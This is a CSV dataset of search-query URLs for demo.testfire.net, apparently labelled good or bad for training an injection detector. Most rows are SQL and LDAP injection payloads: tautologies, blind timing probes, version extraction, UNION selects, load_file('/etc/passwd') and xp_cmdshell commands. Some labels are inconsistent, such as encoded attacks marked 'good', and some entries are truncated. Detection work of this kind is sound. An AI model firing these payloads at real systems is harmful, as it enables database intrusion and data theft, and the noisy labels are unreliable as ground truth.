path,content,host,class_flag
/search.jsp?query= ORDER BY 8 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 9 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 10 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 11 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 12 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 13 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 14 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 15 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 16 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 17 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 18 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 19 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 20 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 21 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 22 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 23 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 24 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 26 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 25 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 27 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 28 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 29 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 30 ,,demo.testfire.net,['bad']
/search.jsp?query= ORDER BY 31337 ,,demo.testfire.net,['bad']
/search.jsp?query= RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',,demo.testfire.net,['bad']
/search.jsp?query= RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=',,demo.testfire.net,['bad']
/search.jsp?query=IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--,,demo.testfire.net,['bad']
/search.jsp?query=%' AND 8310=8310 AND '%'=',,demo.testfire.net,['bad']
/search.jsp?query=%' AND 8310=8311 AND '%'=',,demo.testfire.net,['bad']
/search.jsp?query=IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--,,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,1,1))='X'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,1,1))='M'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,2,1))='i'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,2,1))='y'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,3,1))='c'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,3,1))='X'",,demo.testfire.net,['bad']
"/search.jsp?query= and (select substring(@@version,3,1))='S'",,demo.testfire.net,['bad']
/search.jsp?query=) or ('x'='x,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=; execute immediate 'sel' || 'ect us' || 'er',,demo.testfire.net,['bad']
"/search.jsp?query=benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=update,,demo.testfire.net,['good']
"/search.jsp?query="";waitfor delay '0:0:__TIME__'--",,demo.testfire.net,['bad']
/search.jsp?query=1) or pg_sleep(__TIME__)--,,demo.testfire.net,['bad']
"/search.jsp?query=||(elt(-3+5,bin(15),ord(10),hex(char(45))))",,demo.testfire.net,['bad']
"/search.jsp?query=hi"""""""") or (""""""""a""""""""=""""""""a""""""",,demo.testfire.net,['bad']
/search.jsp?query=delete,,demo.testfire.net,['bad']
/search.jsp?query=like,,demo.testfire.net,['bad']
"/search.jsp?query="" or sleep(__TIME__)#",,demo.testfire.net,['bad']
/search.jsp?query=pg_sleep(__TIME__)--,,demo.testfire.net,['bad']
/search.jsp?query=*(|(objectclass=*)),,demo.testfire.net,['bad']
/search.jsp?query=declare @q nvarchar (200) 0x730065006c00650063 ...,,demo.testfire.net,['bad']
/search.jsp?query= or 0=0 #,,demo.testfire.net,['bad']
/search.jsp?query=insert,,demo.testfire.net,['bad']
/search.jsp?query=1) or sleep(__TIME__)#,,demo.testfire.net,['bad']
/search.jsp?query=) or ('a'='a,,demo.testfire.net,['bad']
/search.jsp?query=; exec xp_regread,,demo.testfire.net,['bad']
/search.jsp?query=*|,,demo.testfire.net,['bad']
/search.jsp?query=@var select @var as var into temp end --,,demo.testfire.net,['bad']
"/search.jsp?query=1)) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=asc,,demo.testfire.net,['good']
/search.jsp?query=(||6),,demo.testfire.net,['bad']
"/search.jsp?query=a"""""""" or 3=3--""""""",,demo.testfire.net,['bad']
/search.jsp?query=# from wapiti,,demo.testfire.net,['bad']
"/search.jsp?query="" or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query= or 0=0 --,,demo.testfire.net,['bad']
/search.jsp?query=1 waitfor delay '0:0:10'--,,demo.testfire.net,['bad']
/search.jsp?query= or 'a'='a,,demo.testfire.net,['bad']
"/search.jsp?query=hi or 1=1 --""",,demo.testfire.net,['bad']
/search.jsp?query=or a = a,,demo.testfire.net,['bad']
/search.jsp?query= UNION ALL SELECT,,demo.testfire.net,['bad']
/search.jsp?query=) or sleep(__TIME__)=',,demo.testfire.net,['bad']
/search.jsp?query=hi' or 'a'='a,,demo.testfire.net,['bad']
"/search.jsp?query=)) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=0,,demo.testfire.net,['good']
/search.jsp?query=21%,,demo.testfire.net,['good']
/search.jsp?query=limit,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1,,demo.testfire.net,['bad']
"/search.jsp?query="")) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query= or 2 > 1,,demo.testfire.net,['bad']
/search.jsp?query=PRINT,,demo.testfire.net,['bad']
/search.jsp?query=hi') or ('a'='a,,demo.testfire.net,['bad']
/search.jsp?query= or 3=3,,demo.testfire.net,['bad']
/search.jsp?query=));waitfor delay '0:0:__TIME__'--,,demo.testfire.net,['bad']
/search.jsp?query=a' waitfor delay '0:0:10'--,,demo.testfire.net,['bad']
"/search.jsp?query=1;(load_file(char(47,101,116,99,47,112,97,115, ...",,demo.testfire.net,['bad']
/search.jsp?query=or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=1 or sleep(__TIME__)#,,demo.testfire.net,['bad']
/search.jsp?query= and 1 in (select var from temp)--,,demo.testfire.net,['bad']
/search.jsp?query= or '7659'='7659,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1,,demo.testfire.net,['bad']
/search.jsp?query= or 'text' = n'text',,demo.testfire.net,['bad']
/search.jsp?query= or 1=1 or ''=',,demo.testfire.net,['bad']
/search.jsp?query= --,,demo.testfire.net,['bad']
/search.jsp?query=declare @s varchar (200) select @s = 0x73656c6 ...,,demo.testfire.net,['bad']
/search.jsp?query=exec xp,,demo.testfire.net,['bad']
/search.jsp?query=; exec master..xp_cmdshell 'ping 172.10.1.255'--,,demo.testfire.net,['bad']
/search.jsp?query=3.10E+17,,demo.testfire.net,['good']
"/search.jsp?query= or pg_sleep(__TIME__)--""",,demo.testfire.net,['bad']
/search.jsp?query=x' AND email IS NULL; --,,demo.testfire.net,['bad']
/search.jsp?query=&,,demo.testfire.net,['good']
/search.jsp?query=admin' or ',,demo.testfire.net,['bad']
/search.jsp?query= or 'unusual' = 'unusual',,demo.testfire.net,['bad']
/search.jsp?query=//,,demo.testfire.net,['good']
/search.jsp?query=truncate,,demo.testfire.net,['good']
"/search.jsp?query=1) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=\x27UNION SELECT,,demo.testfire.net,['bad']
/search.jsp?query=declare @s varchar(200) select @s = 0x77616974 ...,,demo.testfire.net,['bad']
/search.jsp?query=tz_offset,,demo.testfire.net,['good']
/search.jsp?query=sqlvuln,,demo.testfire.net,['bad']
"/search.jsp?query=""));waitfor delay '0:0:__TIME__'--",,demo.testfire.net,['bad']
/search.jsp?query=||6,,demo.testfire.net,['bad']
/search.jsp?query=or 1=1 --,,demo.testfire.net,['bad']
/search.jsp?query=*(|(objectclass=*)),,demo.testfire.net,['bad']
/search.jsp?query=or a=a,,demo.testfire.net,['bad']
/search.jsp?query=) union select * from information_schema.tables;,,demo.testfire.net,['bad']
/search.jsp?query=PRINT @@variable,,demo.testfire.net,['bad']
/search.jsp?query=or isNULL(1/0) /*,,demo.testfire.net,['bad']
/search.jsp?query=26 %,,demo.testfire.net,['good']
"/search.jsp?query= or """"a""""=""""a""",,demo.testfire.net,['bad']
/search.jsp?query=(sqlvuln),,demo.testfire.net,['bad']
/search.jsp?query=x' AND members.email IS NULL; --,,demo.testfire.net,['bad']
/search.jsp?query= or 1=1--,,demo.testfire.net,['bad']
"/search.jsp?query= and 1=( if((load_file(char(110,46,101,120,11 ...",,demo.testfire.net,['bad']
/search.jsp?query=0x770061006900740066006F0072002000640065006C00 ...,,demo.testfire.net,['good']
/search.jsp?query= 'sleep 50',,demo.testfire.net,['bad']
/search.jsp?query=as,,demo.testfire.net,['good']
/search.jsp?query=1)) or pg_sleep(__TIME__)--,,demo.testfire.net,['bad']
/search.jsp?query=/**/or/**/1/**/=/**/1,,demo.testfire.net,['bad']
/search.jsp?query= union all select @@version--,,demo.testfire.net,['bad']
"/search.jsp?query=,@variable",,demo.testfire.net,['bad']
/search.jsp?query=(sqlattempt2),,demo.testfire.net,['bad']
/search.jsp?query= or (EXISTS),,demo.testfire.net,['bad']
/search.jsp?query= $(sleep 50),,demo.testfire.net,['bad']
/search.jsp?query=t'exec master..xp_cmdshell 'nslookup www.googl ...,,demo.testfire.net,['bad']
"/search.jsp?query=1 or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query= or ''=',,demo.testfire.net,['bad']
/search.jsp?query=||UTL_HTTP.REQUEST,,demo.testfire.net,['bad']
/search.jsp?query= or pg_sleep(__TIME__)--,,demo.testfire.net,['bad']
/search.jsp?query=hi' or 'x'='x';,,demo.testfire.net,['bad']
/search.jsp?query=) or sleep(__TIME__)=,,demo.testfire.net,['bad']
/search.jsp?query= or 'whatever' in ('whatever'),,demo.testfire.net,['bad']
/search.jsp?query=; begin declare @var varchar(8000) set @var=' ...,,demo.testfire.net,['bad']
"/search.jsp?query= union select 1,load_file('/etc/passwd'),1,1,1;",,demo.testfire.net,['bad']
/search.jsp?query=0x77616974666F722064656C61792027303A303A313027 ...,,demo.testfire.net,['good']
/search.jsp?query=exec(@s),,demo.testfire.net,['bad']
/search.jsp?query=) or pg_sleep(__TIME__)--,,demo.testfire.net,['bad']
/search.jsp?query= union select,,demo.testfire.net,['bad']
/search.jsp?query= or sleep(__TIME__)#,,demo.testfire.net,['bad']
/search.jsp?query= select * from information_schema.tables--,,demo.testfire.net,['bad']
/search.jsp?query=a' or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=a' or 'a' = 'a,,demo.testfire.net,['bad']
/search.jsp?query=declare @s varchar(22) select @s =,,demo.testfire.net,['bad']
/search.jsp?query= or 2 between 1 and 3,,demo.testfire.net,['bad']
/search.jsp?query= or a=a--,,demo.testfire.net,['bad']
/search.jsp?query= or '1'='1,,demo.testfire.net,['bad']
/search.jsp?query=|,,demo.testfire.net,['good']
/search.jsp?query= or 1 --',,demo.testfire.net,['bad']
/search.jsp?query= or sleep(__TIME__)=',,demo.testfire.net,['bad']
"/search.jsp?query=or 0=0 #""",,demo.testfire.net,['bad']
/search.jsp?query=having,,demo.testfire.net,['bad']
/search.jsp?query=a',,demo.testfire.net,['good']
"/search.jsp?query="" or isNULL(1/0) /*",,demo.testfire.net,['bad']
/search.jsp?query=declare @s varchar (8000) select @s = 0x73656c ...,,demo.testfire.net,['bad']
/search.jsp?query=‘ or 1=1 --,,demo.testfire.net,['bad']
/search.jsp?query=char@39A+@SELECT,,demo.testfire.net,['bad']
/search.jsp?query=order by,,demo.testfire.net,['bad']
/search.jsp?query=bfilename,,demo.testfire.net,['bad']
/search.jsp?query= having 1=1--,,demo.testfire.net,['bad']
"/search.jsp?query=) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query= or username like char(37);,,demo.testfire.net,['bad']
/search.jsp?query=;waitfor delay '0:0:__TIME__'--,,demo.testfire.net,['bad']
/search.jsp?query=x' AND userid IS NULL; --,,demo.testfire.net,['bad']
"/search.jsp?query= or 1=1--""",,demo.testfire.net,['bad']
/search.jsp?query=*/*,,demo.testfire.net,['bad']
/search.jsp?query= or 'text' > 't',,demo.testfire.net,['bad']
/search.jsp?query= (select top 1,,demo.testfire.net,['bad']
"/search.jsp?query= or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=a' or 3=3--,,demo.testfire.net,['bad']
"/search.jsp?query="");waitfor delay '0:0:__TIME__'--",,demo.testfire.net,['bad']
/search.jsp?query= -- &password=,,demo.testfire.net,['bad']
/search.jsp?query= group by userid having 1=1--,,demo.testfire.net,['bad']
/search.jsp?query= or ''=',,demo.testfire.net,['bad']
/search.jsp?query=; exec master..xp_cmdshell,,demo.testfire.net,['bad']
/search.jsp?query= or x=x,,demo.testfire.net,['bad']
/search.jsp?query=select,,demo.testfire.net,['bad']
"/search.jsp?query=)) or sleep(__TIME__)=""""""",,demo.testfire.net,['bad']
/search.jsp?query=0x730065006c0065006300740020004000400076006500 ...,,demo.testfire.net,['good']
/search.jsp?query=hi' or 1=1 --,,demo.testfire.net,['bad']
"/search.jsp?query="") or pg_sleep(__TIME__)--",,demo.testfire.net,['bad']
/search.jsp?query= or 'x'='x,,demo.testfire.net,['bad']
/search.jsp?query= or 'something' = 'some'+'thing',,demo.testfire.net,['bad']
/search.jsp?query=exec sp,,demo.testfire.net,['bad']
/search.jsp?query=29 %,,demo.testfire.net,['good']
/search.jsp?query=(,,demo.testfire.net,['good']
/search.jsp?query=ý or 1=1 --,,demo.testfire.net,['bad']
/search.jsp?query=1 or pg_sleep(__TIME__)--,,demo.testfire.net,['bad']
/search.jsp?query=0 or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=) or (a=a,,demo.testfire.net,['bad']
/search.jsp?query=uni/**/on sel/**/ect,,demo.testfire.net,['bad']
/search.jsp?query=replace,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=)) or pg_sleep(__TIME__)--,,demo.testfire.net,['bad']
/search.jsp?query=|,,demo.testfire.net,['good']
/search.jsp?query=&apos; OR,,demo.testfire.net,['bad']
/search.jsp?query=x' AND 1=(SELECT COUNT(*) FROM tabname); --,,demo.testfire.net,['bad']
/search.jsp?query=declare @q nvarchar (200) select @q = 0x770061 ...,,demo.testfire.net,['bad']
/search.jsp?query=; or '1'='1',,demo.testfire.net,['bad']
/search.jsp?query=1 or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=; exec ('sel' + 'ect us' + 'er'),,demo.testfire.net,['bad']
/search.jsp?query=23 OR 1=1,,demo.testfire.net,['bad']
/search.jsp?query=/,,demo.testfire.net,['good']
/search.jsp?query=anything' OR 'x'='x,,demo.testfire.net,['bad']
/search.jsp?query=declare @q nvarchar (4000) select @q =,,demo.testfire.net,['bad']
/search.jsp?query=or 0=0 --,,demo.testfire.net,['bad']
/search.jsp?query=desc,,demo.testfire.net,['good']
/search.jsp?query=||'6,,demo.testfire.net,['bad']
/search.jsp?query=),,demo.testfire.net,['good']
/search.jsp?query=1)) or sleep(__TIME__)#,,demo.testfire.net,['bad']
/search.jsp?query=or 0=0 #,,demo.testfire.net,['bad']
/search.jsp?query= select name from syscolumns where id = (sele ...,,demo.testfire.net,['bad']
/search.jsp?query=hi or a=a,,demo.testfire.net,['bad']
/search.jsp?query=password:*/=1--,,demo.testfire.net,['bad']
/search.jsp?query=*(|(mail=*)),,demo.testfire.net,['bad']
/search.jsp?query=distinct,,demo.testfire.net,['good']
/search.jsp?query=);waitfor delay '0:0:__TIME__'--,,demo.testfire.net,['bad']
/search.jsp?query=to_timestamp_tz,,demo.testfire.net,['good']
"/search.jsp?query=) or benchmark(10000000,MD5(1))#""",,demo.testfire.net,['bad']
/search.jsp?query=*(|(mail=*)),,demo.testfire.net,['bad']
/search.jsp?query=#NAME?,,demo.testfire.net,['good']
/search.jsp?query= or 1=1 /*,,demo.testfire.net,['bad']
/search.jsp?query=)) or sleep(__TIME__)=',,demo.testfire.net,['bad']
"/search.jsp?query=or 1=1 or """"=",,demo.testfire.net,['bad']
/search.jsp?query= or 1 in (select @@version)--,,demo.testfire.net,['bad']
/search.jsp?query=sqlvuln;,,demo.testfire.net,['bad']
/search.jsp?query= union select * from users where login = char ...,,demo.testfire.net,['bad']
/search.jsp?query=x' or 1=1 or 'x'='y,,demo.testfire.net,['bad']
/search.jsp?query=28%,,demo.testfire.net,['good']
/search.jsp?query=‘ or 3=3 --,,demo.testfire.net,['bad']
/search.jsp?query=@variable,,demo.testfire.net,['bad']
/search.jsp?query= or '1'='1'--,,demo.testfire.net,['bad']
"/search.jsp?query=a"" or 1=1--",,demo.testfire.net,['bad']
/search.jsp?query=//*,,demo.testfire.net,['bad']
/search.jsp?query=*|,,demo.testfire.net,['bad']
"/search.jsp?query="" or 0=0 --",,demo.testfire.net,['bad']
"/search.jsp?query=)) or pg_sleep(__TIME__)--""",,demo.testfire.net,['bad']
/search.jsp?query=?,,demo.testfire.net,['good']
/search.jsp?query= or 1/*,,demo.testfire.net,['bad']
/search.jsp?query=!,,demo.testfire.net,['good']
/search.jsp?query=',,demo.testfire.net,['good']
/search.jsp?query= or a = a,,demo.testfire.net,['bad']
/search.jsp?query=declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q),,demo.testfire.net,['bad']
/search.jsp?query=declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) ,,demo.testfire.net,['bad']
/search.jsp?query=declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q),,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query=declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s),,demo.testfire.net,['bad']
/search.jsp?query= or 1=1 --,,demo.testfire.net,['bad']
/search.jsp?query='; exec master..xp_cmdshell 'ping 172.10.1.255'--,,demo.testfire.net,['bad']
/search.jsp?query=x' OR full_name LIKE '%Bob%,,demo.testfire.net,['bad']
/search.jsp?query=' or ''=',,demo.testfire.net,['bad']
/search.jsp?query=' or 'x'='x,,demo.testfire.net,['bad']
/search.jsp?query=') or ('x'='x,,demo.testfire.net,['bad']
/search.jsp?query=' or 0=0 --,,demo.testfire.net,['bad']
/search.jsp?query=' or 0=0 #,,demo.testfire.net,['bad']
"/search.jsp?query= or 0=0 #""",,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' or '1'='1'--,,demo.testfire.net,['bad']
/search.jsp?query=' or 1 --',,demo.testfire.net,['bad']
/search.jsp?query=or 1=1--,,demo.testfire.net,['bad']
/search.jsp?query=' or 1=1 or ''=',,demo.testfire.net,['bad']
"/search.jsp?query= or 1=1 or """"=",,demo.testfire.net,['bad']
/search.jsp?query=' or a=a--,,demo.testfire.net,['bad']
/search.jsp?query= or a=a,,demo.testfire.net,['bad']
/search.jsp?query=') or ('a'='a,,demo.testfire.net,['bad']
/search.jsp?query='hi' or 'x'='x';,,demo.testfire.net,['bad']
/search.jsp?query=or,,demo.testfire.net,['bad']
/search.jsp?query=procedure,,demo.testfire.net,['good']
/search.jsp?query=handler,,demo.testfire.net,['bad']
/search.jsp?query=' or username like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or uname like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or uid like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or userid like '%,,demo.testfire.net,['bad']
/search.jsp?query=' or user like '%,,demo.testfire.net,['bad']
/search.jsp?query='; exec master..xp_cmdshell,,demo.testfire.net,['bad']
/search.jsp?query='; exec xp_regread,,demo.testfire.net,['bad']
/search.jsp?query=t'exec master..xp_cmdshell 'nslookup www.google.com'--,,demo.testfire.net,['bad']
/search.jsp?query=' UNION SELECT,,demo.testfire.net,['bad']
/search.jsp?query=' UNION ALL SELECT,,demo.testfire.net,['bad']
/search.jsp?query=' or (EXISTS),,demo.testfire.net,['bad']
/search.jsp?query=' (select top 1,,demo.testfire.net,['bad']
/search.jsp?query='||UTL_HTTP.REQUEST,,demo.testfire.net,['bad']
/search.jsp?query=1;SELECT *,,demo.testfire.net,['bad']
"/search.jsp?query=<>""'%;)(&+",,demo.testfire.net,['good']
/search.jsp?query=' or 1=1,,demo.testfire.net,['bad']
/search.jsp?query='sqlattempt1,,demo.testfire.net,['good']
/search.jsp?query=29%,,demo.testfire.net,['good']
/search.jsp?query=26%,,demo.testfire.net,['good']
/search.jsp?query=' or ''=',,demo.testfire.net,['bad']
/search.jsp?query=' or 3=3,,demo.testfire.net,['bad']
/search.jsp?query=' or 3=3 --,,demo.testfire.net,['bad']
/search.jsp?query=sleep(5)#,,demo.testfire.net,['bad']
/search.jsp?query=1 or sleep(5)#,,demo.testfire.net,['bad']
"/search.jsp?query="" or sleep(5)#",,demo.testfire.net,['bad']
/search.jsp?query=' or sleep(5)#,,demo.testfire.net,['bad']
"/search.jsp?query="" or sleep(5)=""",,demo.testfire.net,['bad']
/search.jsp?query=' or sleep(5)=',,demo.testfire.net,['bad']
/search.jsp?query=1) or sleep(5)#,,demo.testfire.net,['bad']
"/search.jsp?query="") or sleep(5)=""",,demo.testfire.net,['bad']
/search.jsp?query=') or sleep(5)=',,demo.testfire.net,['bad']
/search.jsp?query=1)) or sleep(5)#,,demo.testfire.net,['bad']
"/search.jsp?query="")) or sleep(5)=""",,demo.testfire.net,['bad']
/search.jsp?query=')) or sleep(5)=',,demo.testfire.net,['bad']
/search.jsp?query=;waitfor delay '0:0:5'--,,demo.testfire.net,['bad']
/search.jsp?query=);waitfor delay '0:0:5'--,,demo.testfire.net,['bad']
/search.jsp?query=';waitfor delay '0:0:5'--,,demo.testfire.net,['bad']
"/search.jsp?query="";waitfor delay '0:0:5'--",,demo.testfire.net,['bad']
/search.jsp?query=');waitfor delay '0:0:5'--,,demo.testfire.net,['bad']
"/search.jsp?query="");waitfor delay '0:0:5'--",,demo.testfire.net,['bad']
/search.jsp?query=));waitfor delay '0:0:5'--,,demo.testfire.net,['bad']
/search.jsp?query='));waitfor delay '0:0:5'--,,demo.testfire.net,['bad']
"/search.jsp?query=""));waitfor delay '0:0:5'--",,demo.testfire.net,['bad']
"/search.jsp?query=benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
"/search.jsp?query=1 or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
"/search.jsp?query="" or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
"/search.jsp?query=' or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
"/search.jsp?query=1) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
"/search.jsp?query="") or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
"/search.jsp?query=') or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
"/search.jsp?query=1)) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
"/search.jsp?query="")) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
"/search.jsp?query=')) or benchmark(10000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=pg_sleep(5)--,,demo.testfire.net,['bad']
/search.jsp?query=1 or pg_sleep(5)--,,demo.testfire.net,['bad']
"/search.jsp?query="" or pg_sleep(5)--",,demo.testfire.net,['bad']
/search.jsp?query=' or pg_sleep(5)--,,demo.testfire.net,['bad']
/search.jsp?query=1) or pg_sleep(5)--,,demo.testfire.net,['bad']
"/search.jsp?query="") or pg_sleep(5)--",,demo.testfire.net,['bad']
/search.jsp?query=') or pg_sleep(5)--,,demo.testfire.net,['bad']
/search.jsp?query=1)) or pg_sleep(5)--,,demo.testfire.net,['bad']
"/search.jsp?query="")) or pg_sleep(5)--",,demo.testfire.net,['bad']
/search.jsp?query=')) or pg_sleep(5)--,,demo.testfire.net,['bad']
/search.jsp?query=AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe,,demo.testfire.net,['bad']
/search.jsp?query=AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=',,demo.testfire.net,['bad']
/search.jsp?query=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP),,demo.testfire.net,['bad']
/search.jsp?query=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--,,demo.testfire.net,['bad']
/search.jsp?query=AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#,,demo.testfire.net,['bad']
/search.jsp?query=SLEEP(5)#,,demo.testfire.net,['bad']
/search.jsp?query=SLEEP(5)--,,demo.testfire.net,['bad']
"/search.jsp?query=SLEEP(5)=""",,demo.testfire.net,['bad']
/search.jsp?query=SLEEP(5)=',,demo.testfire.net,['bad']
/search.jsp?query=or SLEEP(5),,demo.testfire.net,['bad']
/search.jsp?query=or SLEEP(5)#,,demo.testfire.net,['bad']
/search.jsp?query=or SLEEP(5)--,,demo.testfire.net,['bad']
"/search.jsp?query=or SLEEP(5)=""",,demo.testfire.net,['bad']
/search.jsp?query=or SLEEP(5)=',,demo.testfire.net,['bad']
/search.jsp?query=waitfor delay '00:00:05',,demo.testfire.net,['bad']
/search.jsp?query=waitfor delay '00:00:05'--,,demo.testfire.net,['bad']
/search.jsp?query=waitfor delay '00:00:05'#,,demo.testfire.net,['bad']
"/search.jsp?query=benchmark(50000000,MD5(1))",,demo.testfire.net,['bad']
"/search.jsp?query=benchmark(50000000,MD5(1))--",,demo.testfire.net,['bad']
"/search.jsp?query=benchmark(50000000,MD5(1))#",,demo.testfire.net,['bad']
"/search.jsp?query=or benchmark(50000000,MD5(1))",,demo.testfire.net,['bad']
"/search.jsp?query=or benchmark(50000000,MD5(1))--",,demo.testfire.net,['bad']
"/search.jsp?query=or benchmark(50000000,MD5(1))#",,demo.testfire.net,['bad']
/search.jsp?query=pg_SLEEP(5),,demo.testfire.net,['bad']
/search.jsp?query=pg_SLEEP(5)--,,demo.testfire.net,['bad']
/search.jsp?query=pg_SLEEP(5)#,,demo.testfire.net,['bad']
/search.jsp?query=or pg_SLEEP(5),,demo.testfire.net,['bad']
/search.jsp?query=or pg_SLEEP(5)--,,demo.testfire.net,['bad']
/search.jsp?query=or pg_SLEEP(5)#,,demo.testfire.net,['bad']
"/search.jsp?query='\""",,demo.testfire.net,['good']
/search.jsp?query=AnD SLEEP(5),,demo.testfire.net,['bad']
/search.jsp?query=AnD SLEEP(5)--,,demo.testfire.net,['bad']
/search.jsp?query=AnD SLEEP(5)#,,demo.testfire.net,['bad']
/search.jsp?query=&&SLEEP(5),,demo.testfire.net,['bad']
/search.jsp?query=&&SLEEP(5)--,,demo.testfire.net,['bad']
/search.jsp?query=&&SLEEP(5)#,,demo.testfire.net,['bad']
/search.jsp?query=' AnD SLEEP(5) ANd '1,,demo.testfire.net,['bad']
/search.jsp?query='&&SLEEP(5)&&'1,,demo.testfire.net,['bad']
/search.jsp?query=ORDER BY SLEEP(5),,demo.testfire.net,['bad']
